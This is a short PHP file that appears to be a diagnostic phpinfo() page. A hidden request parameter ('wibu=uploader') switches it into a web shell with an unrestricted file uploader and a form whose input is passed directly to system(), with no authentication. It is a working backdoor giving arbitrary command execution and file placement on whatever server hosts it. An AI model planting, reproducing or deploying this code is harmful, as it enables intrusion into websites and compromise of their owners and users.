<?php
if($_REQUEST['wibu'] == 'uploader') {
?>
<?php
echo "<form action='' enctype='multipart/form-data' method='POST'>
<input type='file' name='filena'>
<input type='submit' name='upload' value='Upload !'>
</form>";
if (isset($_POST['upload'])) {
  $cwd=getcwd();
  $tmp=$_FILES['filena']['tmp_name'];
  $file=$_FILES['filena']['name'];
  if (@copy($tmp, $file)){
    echo "File berhasil terupload! => $cwd/$file";
  }
  else {
    echo "File gagal terupload :(";
  }
}
echo"CMD";
echo "<pre>";
        echo "<form name='form' action='#' method='post'>
       <input type='text' name='coba'/> <input type='submit' value='enter'/>
       </form>";
        $cmd = ($_POST['coba']);
        system($cmd);
        echo "</pre>";
?>
<?php
   die;
}
phpinfo();
?>